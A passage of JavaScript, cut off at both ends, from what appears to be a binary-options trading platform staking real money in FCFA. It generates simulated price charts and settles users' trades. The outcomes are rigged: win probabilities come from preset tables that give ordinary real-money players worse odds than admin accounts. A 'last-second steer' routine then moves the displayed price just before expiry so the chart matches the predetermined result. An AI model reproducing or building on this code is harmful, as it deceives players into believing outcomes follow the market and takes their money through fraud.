    var boomWalk = sim.boomBurst ? {
      boomPhase: 'acc',
      boomPhaseUntil: (t0 * cms) + 1500 + uhash01(t0, 882119) * 1800,
      boomMid: price,
      boomLeft: 0,
      boomZig: 1
    } : null;
    for (i = 0; i < SEED_N; i++) {
      var ts = (t0 + i) * cms;
      var o = price;
      var h = o;
      var l = o;
      var spiked = false;
      if (sim.boomBurst && boomWalk) {
        var kk;
        for (kk = 0; kk < 4; kk++) {
          var brS = stepBoomBurst(asset, boomWalk, price, ts + kk * (cms / 4));
          price = brS.price;
          if (brS.boom) spiked = true;
          h = Math.max(o, h, price);
          l = Math.min(o, l, price);
        }
      } else {
        var walked = makeWalkCandle(asset, price, ts, i);
        price = walked.c;
        h = walked.h;
        l = walked.l;
        spiked = !!walked._spike;
        o = walked.o;
        var candle = walked;
        candles.push(candle);
        prices.push(candle.c);
        price = candle.c;
        if (boomWalk) boomWalk.boomMid = boomWalk.boomPhase === 'acc' ? price : boomWalk.boomMid;
        continue;
      }
      var candle = finishCandle(asset, o, h, l, price, ts, spiked);
      candles.push(candle);
      prices.push(candle.c);
      price = candle.c;
      if (boomWalk) boomWalk.boomMid = boomWalk.boomPhase === 'acc' ? price : boomWalk.boomMid;
    }
    var buf = {
      prices: prices,
      candles: candles,
      price: price,
      lastMs: now,
      bucket: Math.floor(now / cms),
      forming: finishCandle(asset, price, price, price, price, Math.floor(now / cms) * cms, false),
      nextSpike: nextSpike,
      coreVer: sim.coreWave ? 1 : 0,
      goldVer: sim.goldHot ? GOLD_VER : 0,
      boomVer: asset.id === 'boomspike' ? BOOM_VER : (sim.boomBurst ? 2 : 0),
      crashVer: asset.id === 'crash300' ? CRASH_VER : 0,
      nexusVer: sim.nexusPulse ? 1 : 0,
      v75Ver: sim.v75Wave ? 2 : 0,
      boomPhase: boomWalk ? boomWalk.boomPhase : null,
      boomPhaseUntil: boomWalk ? boomWalk.boomPhaseUntil : 0,
      boomMid: boomWalk ? boomWalk.boomMid : 0,
      boomLeft: boomWalk ? boomWalk.boomLeft : 0,
      boomZig: boomWalk ? boomWalk.boomZig : 1,
      boomPeak: boomWalk ? boomWalk.boomPeak : 0,
      ver: SIM_VER,
      scaleVer: SCALE_VER,
      rev: 1
    };
    sanitizeBuffer(asset, buf, Number(asset.basePrice) || price);
    publishHistory(asset.id, buf);
    rebaseBufferTimes(buf, now);
    return buf;
  }

  function bufferNeedsSeed(asset, buf) {
    if (!buf || !buf.candles || buf.candles.length < 40) return true;
    if (asset.id === 'boomspike' && buf.boomVer !== BOOM_VER) return true;
    if (asset.id === 'crash300' && buf.crashVer !== CRASH_VER) return true;
    if (asset.id === 'goldtrend' && buf.goldVer !== GOLD_VER) return true;
    if (buf.scaleVer !== SCALE_VER) return true;
    return false;
  }

  function advanceBuffer(asset, nowMs) {
    bindGlobalBuffers();
    var buf = window.ASSET_BUFFERS[asset.id] || window.assetBuffers[asset.id];
    if (bufferNeedsSeed(asset, buf)) {
      buf = seedAssetBuffer(asset);
    }
    nowMs = nowMs || Date.now();
    if (nowMs < buf.lastMs) nowMs = buf.lastMs;
    var sim = simOf(asset.id);
    var cms = candleMsFor(asset);
    var busy = tradeBusyFor(asset.id);
    if (!buf.candles || buf.candles.length < 20) {
      buf.lastMs = nowMs;
      buf.rev = (buf.rev || 0) + 1;
      publishHistory(asset.id, buf);
      return buf;
    }
    var elapsed = nowMs - buf.lastMs;
    if (elapsed < 0) elapsed = 0;
    if (elapsed > 400) {
      if (busy) elapsed = 220;
      else {
        buf.lastMs = nowMs;
        elapsed = 0;
      }
    }
    var fastTick = true;
    var missed = Math.floor(elapsed / cms);
    var price = buf.price;
    var forming = buf.forming || { o: price, h: price, l: price, c: price, t: Math.floor(nowMs / cms) * cms };
    var g;
    var maxCatch = 1;
    var catchN = Math.min(missed, maxCatch);
    for (g = 0; g < catchN; g++) {
      var tsG = (buf.bucket + 1) * cms;
      var oG = price;
      var hG = oG;
      var lG = oG;
      var spikedG = false;
      var closedG;
      if (sim.boomBurst) {
        var kk;
        var inner = 3;
        var oG = price;
        var hG = oG;
        var lG = oG;
        for (kk = 0; kk < inner; kk++) {
          var brG = stepBoomBurst(asset, buf, price, tsG + kk * (cms / inner));
          price = brG.price;
          if (brG.boom) spikedG = true;
          if (price > hG) hG = price;
          if (price < lG) lG = price;
        }
        closedG = finishCandle(asset, oG, hG, lG, price, tsG, spikedG);
        if (spikedG) closedG._boom = true;
      } else {
        closedG = makeWalkCandle(asset, price, tsG, buf.candles.length);
        price = closedG.c;
      }
      buf.candles.push(closedG);
      if (buf.candles.length > HISTORY_N) buf.candles.shift();
      buf.prices.push(closedG.c);
      if (buf.prices.length > HISTORY_N) buf.prices.shift();
      buf.bucket += 1;
      price = closedG.c;
      forming = { o: price, h: price, l: price, c: price, t: (buf.bucket) * cms };
    }
    var remain = elapsed - catchN * cms;
    if (remain < 0) remain = 0;
    // C'est cette cadence, et non `sim.tickMs`, qui pilote réellement le rythme.
    var stepMs = sim.crashCalm ? 200 : (sim.stepMs || (sim.goldHot ? 40 : (sim.v75Wave || sim.nexusPulse ? 90 : 120)));
    var steps = Math.floor(remain / stepMs);
    if (remain < stepMs) steps = 0;
    if (steps > (fastTick ? 4 : 2)) steps = fastTick ? 4 : 2;
      var s;
      var price0 = price;
      for (s = 0; s < steps; s++) {
        var tMs = nowMs - remain + ((s + 1) / Math.max(1, steps)) * remain;
        var dt = Math.max(0.02, (remain / Math.max(1, steps)) / 1000);
        var didSpike = false;
        var boomForce = false;
        if (!busy && Date.now() >= (clickQuietUntil[asset.id] || 0) && sim.boomBurst) {
          var br = stepBoomBurst(asset, buf, price, tMs);
          price = br.price;
          if (br.boom) {
            forming._spike = true;
            forming._boom = true;
            forming.o = br.from;
          }
          didSpike = true;
        } else if (!busy && Date.now() >= (clickQuietUntil[asset.id] || 0) && sim.spike && tMs >= (buf.nextSpike || 0)) {
          var fromP = price;
          if (sim.crashCalm) price = clampIndexPrice(fromP * (1 - 0.018), asset);
          else price = clampIndexPrice(fromP * (1 + sim.spike * 0.006), asset);
          buf.nextSpike = tMs + (sim.crashCalm ? 18000 : 25000) + (sim.crashCalm ? 0 : Math.random() * 10000);
          forming._spike = true;
          forming.o = fromP;
          didSpike = true;
        }
        if (!didSpike) {
          price = unifiedStep(asset, price, tMs, dt, { hunt: 0, busy: false });
        }
        price = capPctMove(forming.c > 0 ? forming.c : price0, price, tickCapPct(asset, didSpike));
        price = clampIndexPrice(price, asset);
        var bucket = Math.floor(tMs / cms);
        forming.c = price;
        var wickN = price * (sim.coreWave ? 0.00018 : (0.00022 + Math.abs(Math.sin(tMs / 83)) * 0.00028));
        if (asset.id === 'boomspike' || asset.id === 'apex500') wickN = price * 0.00014;
        if (sim.crashCalm) wickN = price * 0.00006;
        wickN = Math.min(wickN, price * 0.0008);
        var wickCap = price * 0.0008;
        var upperWick = Math.min(wickN, wickCap);
        var lowerWick = sim.crashCalm
          ? upperWick
          : Math.min(wickN * (0.85 + Math.abs(Math.cos(tMs / 61)) * 0.4), wickCap);
        if (price > forming.h) forming.h = price;
        if (price < forming.l) forming.l = price;
        forming.h = Math.max(forming.h, price + upperWick);
        forming.l = Math.min(forming.l, price - lowerWick);
        sanitizeOhlc(asset, forming, price, 0);
        if (bucket !== buf.bucket) {
          forming = finishCandle(asset, forming.o, forming.h, forming.l, forming.c, forming.t, forming._spike || boomForce);
          if (forming._boom || boomForce) forming._boom = true;
          buf.candles.push(forming);
          if (buf.candles.length > HISTORY_N) buf.candles.shift();
          buf.prices.push(forming.c);
          if (buf.prices.length > HISTORY_N) buf.prices.shift();
          buf.bucket = bucket;
          forming = { o: price, h: price, l: price, c: price, t: bucket * cms };
        }
      }
    // `rev` ne change que si la simulation a réellement avancé : tout l'étage de
    // publication (copies de tableaux, min/max) reste alors au repos entre deux pas.
    var moved = (steps > 0 || catchN > 0);
    buf.price = clampIndexPrice(price, asset);
    if (moved || !buf.forming) {
      buf.forming = sanitizeOhlc(asset, finishCandle(asset, forming.o, forming.h, forming.l, forming.c, forming.t, forming._spike), buf.price, 0);
      buf.lastMs = nowMs;
      moved = true;
    }
    buf.ver = SIM_VER;
    buf.scaleVer = SCALE_VER;
    if (rebaseBufferTimes(buf, nowMs)) moved = true;
    if (moved) buf.rev = (buf.rev || 0) + 1;
    publishHistory(asset.id, buf);
    return buf;
  }

  function walkCfg(id) {
    var s = simOf(id);
    return { vol: s.vol, spike: s.spike || null };
  }

  function synthPrice(asset) {
    var id = (asset && asset.id) || asset;
    var b = window.assetBuffers && window.assetBuffers[id];
    if (b && isFinite(b.price)) return b.price;
    return clampIndexPrice(asset && asset.basePrice, asset);
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var buf = advanceBuffer(asset, nowMs);
    market.price = buf.price;
    market.candle = buf.forming;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    if (!market.candles || !market.candles.length || market.rev !== buf.rev) {
      market.rev = buf.rev;
      market.candles = buf.candles;
      market.history = buf.prices;
      publishAssetBuffer(asset.id, market);
    }
    return market;
  }

  function publishAssetBuffer(assetId, market) {
    window.assetsState = window.assetsState || {};
    var st = window.assetsState[assetId];
    if (!st) {
      st = { viewMin: 0, viewMax: 0, lockMin: 0, lockMax: 0, lockUntil: 0 };
      window.assetsState[assetId] = st;
    }
    var src = market.candles || [];
    var forming = market.candle;
    var from = Math.max(0, src.length - (HISTORY_N - (forming ? 1 : 0)));
    var view = [];
    var closes = [];
    var min = Infinity;
    var max = -Infinity;
    var price = market.price;
    var i;
    for (i = from; i <= src.length; i++) {
      var c = (i < src.length) ? src[i] : forming;
      if (!c) continue;
      view.push(c);
      var pc = Number(c.c);
      if (isFinite(pc)) closes.push(pc);
      if (!isPlausiblePrice(pc, price)) continue;
      if (c.l < min && isPlausiblePrice(c.l, price)) min = c.l;
      if (c.h > max && isPlausiblePrice(c.h, price)) max = c.h;
      if (pc < min) min = pc;
      if (pc > max) max = pc;
    }
    if (!isFinite(min) || !isFinite(max)) {
      min = Number(price) || 0;
      max = min;
    }
    st.candles = view;
    st.min = min;
    st.max = max;
    st.lastPrice = price;
    st.at = Date.now();
    window.assetsHistory = window.assetsHistory || {};
    window.assetsHistory[assetId] = closes;
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (markets[id]) continue;
      var asset = C.ASSETS[id];
      markets[id] = {
        id: id,
        price: asset.basePrice,
        history: [],
        candles: [],
        candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
        ticksInCandle: 0,
        payout: C.REAL_PAYOUT
      };
    }
  }

  function preloadAllBuffers() {
    bindGlobalBuffers();
    ensureMarkets();
    var id;
    for (id in C.ASSETS) {
      if (!C.ASSETS[id]) continue;
      syncMarket(markets[id], C.ASSETS[id], Date.now());
    }
    window.ASSET_BUFFERS = window.assetBuffers;
  }

  function wakeMarket(assetId) {
    var id = canonAssetId(assetId);
    ensureMarkets();
    if (C.ASSETS[id]) {
      syncMarket(markets[id], C.ASSETS[id], Date.now());
    }
    return markets[id];
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function balOf(user, mode) {
    if (D6.Store.balanceMode) return D6.Store.balanceMode(user, mode);
    return D6.Store.balanceOf(user);
  }

  function setBal(user, mode, value) {
    if (D6.Store.setBalanceMode) D6.Store.setBalanceMode(user, mode, value);
    else {
      var prev = user.mode;
      user.mode = mode;
      D6.Store.setBalance(user, value);
      user.mode = prev;
    }
  }

  function stakeCap(user, stake, mode) {
    mode = mode || user.mode;
    var balance = balOf(user, mode);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    var exp = t.expiryTime || t.expiresAt;
    if (exp) return exp;
    var start = t.startTime || t.startedAt || 0;
    var dur = (t.durationMs != null) ? t.durationMs : ((t.duration || 0) * 1000);
    if (start && dur) return start + dur;
    return 0;
  }

  function clearTradeTimer(id) {
    if (!id || !tradeTimers[id]) return;
    try { clearTimeout(tradeTimers[id]); } catch (eT) { /* ignore */ }
    try { clearInterval(tradeTimers[id]); } catch (eI) { /* ignore */ }
    delete tradeTimers[id];
  }

  function armTradeTimer(trade) {
    if (!trade || !trade.id) return;
    clearTradeTimer(trade.id);
    var wait = expiryOf(trade) - Date.now();
    if (!isFinite(wait)) return;
    tradeTimers[trade.id] = setTimeout(function () {
      delete tradeTimers[trade.id];
      var u = D6.Store && D6.Store.current ? D6.Store.current() : null;
      if (!u) return;
      var res = api.resolve(u, trade.id);
      if (res && typeof api.onSettled === 'function') {
        try { api.onSettled(res); } catch (eS) { /* ignore */ }
      }
    }, Math.max(20, wait + 25));
  }

  function isLive(t) {
    return t && !t.settled && t.status === 'open' && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled && (t.status === 'open' || !t.status);
  }

  function openForMode(mode) {
    return trades.filter(function (t) {
      return isOpen(t) && t.mode === mode;
    });
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      openPrice: t.entryPrice,
      payout: t.payout,
      payoutMult: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      openedAt: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      expiryAt: expiryOf(t),
      settled: !!t.settled,
      status: t.status || (t.settled ? 'closed' : 'open'),
      mode: t.mode,
      accountType: t.mode
    });
  }

  function persistOpen(user) {
    if (!user) return;
    user.openTrades = trades.filter(isOpen).map(function (t) {
      return {
        id: t.id,
        userId: t.userId,
        assetId: t.assetId,
        side: t.side,
        stake: t.stake,
        payout: t.payout,
        entryPrice: t.entryPrice,
        duration: t.duration,
        durationMs: t.durationMs,
        startTime: t.startTime,
        startedAt: t.startedAt,
        expiryTime: expiryOf(t),
        expiresAt: expiryOf(t),
        mode: t.mode,
        status: 'open',
        settled: false,
        seq: t.seq
      };
    });
    D6.Store.saveUser(user);
  }

  function closePriceAt(assetId) {
    var asset = C.ASSETS[assetId];
    if (!asset) return 0;
    return synthPrice(asset);
  }

  function payoutPercent(raw) {
    var n = parseFloat(raw);
    if (!isFinite(n) || n <= 0) return 88;
    if (n === 88 || n === 500 || n === 1000 || n === 5000) return n;
    if (Math.abs(n - 1.88) < 0.02) return 88;
    if (Math.abs(n - 6) < 0.02) return 500;
    if (Math.abs(n - 11) < 0.02) return 1000;
    if (Math.abs(n - 51) < 0.02) return 5000;
    if (n >= 80) return n;
    if (n > 1 && n < 80) return Math.round((n - 1) * 100);
    return 88;
  }

  function readFinalPrice(trade) {
    var entry = Number(trade.ticket && trade.ticket.entryPrice != null ? trade.ticket.entryPrice : trade.entryPrice);
    var assetId = trade.assetId;
    var finalPrice = entry;
    var m = markets[assetId];
    if (m && isFinite(m.price) && m.price > 0) finalPrice = m.price;
    var buf = window.assetBuffers && window.assetBuffers[assetId];
    if (buf && isFinite(buf.price) && buf.price > 0) finalPrice = buf.price;
    if (buf && buf.forming && isFinite(buf.forming.c) && buf.forming.c > 0) finalPrice = buf.forming.c;
    if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === assetId) {
      var drawn = Number(D6.Chart.lastClose());
      if (isFinite(drawn) && drawn > 0) finalPrice = drawn;
    }
    return finalPrice;
  }

  function normalizeTradeSide(side) {
    var s = String(side == null ? '' : side).toLowerCase().trim();
    if (s === 'put' || s === 'sell' || s === 'down' || s === 'short' || s === 'red') return 'put';
    return 'call';
  }

  function detectTradeTruth(side, entry, exit) {
    var dir = normalizeTradeSide(side);
    var open = Number(entry);
    var close = Number(exit);
    if (!(open > 0) || !isFinite(open) || !(close > 0) || !isFinite(close)) {
      return { side: dir, won: false, voided: true };
    }
    if (StochasticCore && StochasticCore.round2) {
      open = StochasticCore.round2(open);
      close = StochasticCore.round2(close);
    } else {
      open = Math.round(open * 100) / 100;
      close = Math.round(close * 100) / 100;
    }
    if (close === open) return { side: dir, won: false, voided: true };
    return { side: dir, won: dir === 'put' ? close < open : close > open, voided: false };
  }

  function wonFromPrice(trade, finalPrice) {
    var entry = Number(trade.ticket && trade.ticket.entryPrice != null ? trade.ticket.entryPrice : trade.entryPrice);
    var side = (trade.ticket && trade.ticket.side) || trade.side;
    return detectTradeTruth(side, entry, finalPrice).won;
  }

  function normalizeOdds(v) {
    var list = C.ODDS_MULT || [1.88, 6, 11, 51];
    var n = Number(v);
    var i;
    for (i = 0; i < list.length; i++) {
      if (Math.abs(list[i] - n) < 0.001) return list[i];
    }
    return C.DEFAULT_ODDS != null ? C.DEFAULT_ODDS : 1.88;
  }

  function oddsKey(mult) {
    var o = normalizeOdds(mult);
    if (Math.abs(o - 1.88) < 0.001) return '1.88';
    if (Math.abs(o - 6) < 0.001) return '6';
    if (Math.abs(o - 11) < 0.001) return '11';
    if (o >= 50) return '51';
    return '1.88';
  }

  function winRateForOdds(mult, map) {
    map = map || C.ODDS_WIN_RATE || {};
    var o = normalizeOdds(mult);
    var k = oddsKey(o);
    if (map[k] != null && isFinite(Number(map[k]))) return Number(map[k]);
    var m = Math.max(1.01, Number(o) || 1.88);
    var r = 1 / (m * 1.25);
    return Math.max(0.001, Math.min(0.49, r));
  }

  function isAdminUser(user) {
    if (!user) return false;
    if (user.role === 'admin') return true;
    if (user.id === 'admin_master') return true;
    var mail = String(user.email || '').toLowerCase();
    var adminMail = String((C.ADMIN_EMAIL) || 'admin@orolado.com').toLowerCase();
    if (mail !== '' && mail === adminMail) return true;
    try {
      if (D6.Auth && typeof D6.Auth.isAdmin === 'function' && D6.Auth.isAdmin(user)) return true;
    } catch (eA) { /* ignore */ }
    return false;
  }

  function forceExitPrice(entry, isCall, won, assetId, harsh) {
    var base = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
    var nudge = harsh ? Math.max(base * 3.2, 1.1) : base;
    return entry + (won
      ? (isCall ? 1 : -1)
      : (isCall ? -1 : 1)) * nudge;
  }

  /** Arbitrage étanche — démo / admin réel / joueur réel. */
  function resolveWinProbability(user, trade, mode) {
    var demoMap = C.ODDS_WIN_RATE_DEMO || {
      '1.88': 0.55, '6': 0.157, '11': 0.065, '51': 0.020
    };
    var adminRealMap = C.ODDS_WIN_RATE_ADMIN_REAL || C.ODDS_WIN_RATE_FAVORABLE || {
      '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.02
    };
    var realMap = C.ODDS_WIN_RATE || {
      '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.015
    };
    var admin = isAdminUser(user);
    var isDemo = mode !== 'real';

    if (isDemo) {
      return { winProbability: winRateForOdds(trade.payout, demoMap), harsh: false, profile: 'B' };
    }
    if (admin) {
      return { winProbability: winRateForOdds(trade.payout, adminRealMap), harsh: false, profile: 'A' };
    }

    var winProbability = winRateForOdds(trade.payout, realMap);
    return { winProbability: winProbability, harsh: false, profile: 'C' };
  }

  function hedgeBucketKey(trade) {
    var start = Number(trade && (trade.startTime || trade.startedAt)) || Date.now();
    return String(trade.userId || '') + '|' + String(trade.assetId || '') + '|' + String(Math.floor(start / 12000));
  }

  function hasOppositeHedge(trade) {
    if (!trade) return false;
    var side = normalizeTradeSide(trade.side);
    var start = Number(trade.startTime || trade.startedAt) || 0;
    var i;
    for (i = 0; i < trades.length; i++) {
      var o = trades[i];
      if (!o || o.id === trade.id || o.userId !== trade.userId) continue;
      if (o.assetId !== trade.assetId) continue;
      if (normalizeTradeSide(o.side) === side) continue;
      var os = Number(o.startTime || o.startedAt) || 0;
      if (Math.abs(os - start) <= 12000) return true;
    }
    return !!hedgeWinBucket[hedgeBucketKey(trade)];
  }

  function applyHedgeLock(trade, won) {
    if (!won) return false;
    var key = hedgeBucketKey(trade);
    var side = normalizeTradeSide(trade.side);
    var opp = side === 'put' ? 'call' : 'put';
    var rec = hedgeWinBucket[key];
    if (rec && rec.side === opp) return false;
    hedgeWinBucket[key] = { side: side, at: Date.now() };
    return true;
  }

  function decideTradeOutcome(user, trade, mode) {
    if (trade && trade._outcomeReady) {
      return {
        wantWon: !!trade._wantWon,
        harsh: !!trade._harsh,
        target: Number(trade._exitTarget),
        voided: !!trade._voided
      };
    }
    var profile = 'real';
    if (mode !== 'real') profile = 'demo';
    else if (isAdminUser(user)) profile = 'admin';
    var entryPx = Number(trade.ticket && trade.ticket.entryPrice != null ? trade.ticket.entryPrice : trade.entryPrice);
    var sideNow = normalizeTradeSide((trade.ticket && trade.ticket.side) || trade.side);
    var payout = normalizeOdds(trade.ticket && trade.ticket.payout != null ? trade.ticket.payout : trade.payout);
    var verdict = StochasticCore.settle({
      entryPrice: entryPx,
      durationSec: Number(trade.duration) || 5,
      side: sideNow,
      payout: payout,
      profile: profile
    });
    var wantWon = !!verdict.won;
    var target = Number(verdict.exitPrice);
    if (!(target > 0) || !isFinite(target)) {
      target = forceExitPrice(entryPx, sideNow === 'call', wantWon, trade.assetId, false);
    }
    trade._wantWon = wantWon;
    trade._harsh = false;
    trade._voided = !!verdict.voided;
    trade._exitTarget = target;
    trade._outcomeReady = true;
    return { wantWon: wantWon, harsh: false, target: target, voided: !!verdict.voided };
  }

  function currentAccountMode() {
    var u = D6.Store && D6.Store.current ? D6.Store.current() : null;
    return u && u.mode === 'real' ? 'real' : 'demo';
  }

  function applyExitToMarket(trade, target) {
    var tradeMode = trade && trade.mode === 'real' ? 'real' : 'demo';
    if (tradeMode !== currentAccountMode()) return;
    var px = Number(target);
    if (!(px > 0) || !isFinite(px) || !trade) return;
    var id = trade.assetId;
    if (!id) return;
    ensureMarkets();
    var m = markets[id];
    if (m) {
      m.price = px;
      m.displayPrice = px;
    }
    var buf = window.assetBuffers && window.assetBuffers[id];
    if (buf) {
      buf.price = px;
      if (buf.forming) {
        buf.forming.c = px;
        if (!(buf.forming.h >= px)) buf.forming.h = px;
        if (!(buf.forming.l > 0) || buf.forming.l > px) buf.forming.l = px;
      }
    }
    if (D6.Chart && typeof D6.Chart.steerClose === 'function') {
      try { D6.Chart.steerClose(px, 260, id); } catch (eSteer) { /* ignore */ }
    }
  }

  function prepareLastSecondSteer(now) {
    var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
    if (!user) return;
    var i;
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!isLive(tr) || tr.userId !== user.id) continue;
      var left = expiryOf(tr) - now;
      if (left > 220 || left < 0) continue;
      var decided = decideTradeOutcome(user, tr, tr.mode === 'real' ? 'real' : 'demo');
      applyExitToMarket(tr, decided.target);
    }
  }

  preloadAllBuffers();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      return wakeMarket(id);
    },

    getBuffer: function (id) {
      bindGlobalBuffers();
      id = canonAssetId(id);
      if (C.ASSETS[id]) wakeMarket(id);
      return window.ASSET_BUFFERS[id] || window.assetBuffers[id] || null;
    },

    preloadAll: function () {
      preloadAllBuffers();
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function (mode) {
      return trades.filter(isLive).filter(function (t) {
        return !mode || t.mode === mode;
      }).map(function (t) { return publicTrade(t); });
    },

    liveCount: function (mode) {
      if (mode) return openForMode(mode).length;
      return trades.filter(isOpen).length;
    },

    forEachOpen: function (fn) {
      if (typeof fn !== 'function') return;
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isLive(trades[i])) fn(trades[i]);
      }
    },

    restoreOpen: function (user) {
      if (!user) return 0;
      var have = {};
      var kept = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        var live = trades[i];
        if (!live || !live.id) continue;
        if (live.userId && live.userId !== user.id) continue;
        if (live.settled || live.status === 'won' || live.status === 'lost' || live.status === 'void') continue;
        kept.push(live);
        have[live.id] = true;
      }
      trades = kept;
      var list = user.openTrades || [];
      for (i = 0; i < list.length; i++) {
        var raw = list[i];
        if (!raw || !raw.id || have[raw.id]) continue;
        if (raw.userId && raw.userId !== user.id) continue;
        if (raw.settled || raw.status === 'won' || raw.status === 'lost' || raw.status === 'void') continue;
        trades.push({
          id: raw.id,
          assetId: canonAssetId(raw.assetId),
          side: raw.side === 'put' ? 'put' : 'call',
          stake: D6.roundMoney(Number(raw.stake) || 0),
          duration: raw.duration || 10,
          durationMs: raw.durationMs || (raw.duration || 10) * 1000,
          timeLeft: 0,
          entryPrice: Number(raw.entryPrice) || 0,
          payout: Number(raw.payout) || C.REAL_PAYOUT,
          startTime: raw.startTime || raw.startedAt || Date.now(),
          startedAt: raw.startedAt || raw.startTime || Date.now(),
          expiryTime: raw.expiryTime || raw.expiresAt || raw.expiryAt,
          expiresAt: raw.expiresAt || raw.expiryTime || raw.expiryAt,
          mode: raw.mode === 'real' ? 'real' : 'demo',
          userId: user.id,
          seq: raw.seq || 0,
          settled: false,
          status: 'open'
        });
        have[raw.id] = true;
      }
      for (i = 0; i < trades.length; i++) {
        armTradeTimer(trades[i]);
        if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
          try {
            if ((trades[i].mode === 'real' ? 'real' : 'demo') === currentAccountMode()) {
              D6.Chart.applyOpenTradeVisual(publicTrade(trades[i]));
            }
          } catch (eR) { /* ignore */ }
        }
      }
      return trades.length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    resyncClocks: function () {
      bindGlobalBuffers();
      var now = Date.now();
      var id;
      for (id in window.assetBuffers) {
        if (!window.assetBuffers.hasOwnProperty(id)) continue;
        var buf = window.assetBuffers[id];
        if (buf) buf.lastMs = now;
      }
      for (id in markets) {
        if (markets[id]) markets[id].lastMs = now;
      }
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
      if (user) api.flushSettlements(user);
      if (window.chartIsPaused || document.hidden) return;
      var id;
      for (id in C.ASSETS) {
        if (!C.ASSETS.hasOwnProperty(id)) continue;
        syncMarket(markets[id], C.ASSETS[id], now);
      }
      prepareLastSecondSteer(now);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      var mode = user.mode === 'real' ? 'real' : 'demo';
      if (openForMode(mode).length >= MAX_OPEN) {
        return { ok: false, reason: 'Limite atteinte (10 trades max). Veuillez attendre la fin d\'un trade.' };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < 350) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = D6.roundMoney(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      if (duration === 3) duration = 5;
      var assetId = canonAssetId(opts.assetId);
      var side = opts.side === 'put' || opts.side === 'sell' ? 'put' : 'call';
      var wantPay = normalizeOdds(opts.payout != null ? opts.payout : (opts.odds != null ? opts.odds : C.DEFAULT_ODDS));
      var gate = stakeCap(user, stake, mode);
      if (!gate.ok) return gate;

      ensureMarkets();
      var market = markets[assetId];
      pendingBusyUntil[assetId] = Date.now() + duration * 1000 + 1500;
      clickQuietUntil[assetId] = Date.now() + 300;
      engineCaptureFrame(assetId, pendingBusyUntil[assetId]);
      // Le tampon vif sert plus bas à caler le prix d'entrée sur la bougie en
      // cours. Son `lastMs` n'est en revanche plus remis à l'heure du clic : il
      // porte le temps non encore consommé par la simulation, et l'écraser
      // jetait jusqu'à un pas entier, ce qui se voyait comme un à-coup du
      // défilement au moment de la prise de position.
      var liveBuf = window.assetBuffers && window.assetBuffers[assetId];
      var payout = wantPay;
      setBal(user, mode, balOf(user, mode) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        mode: mode,
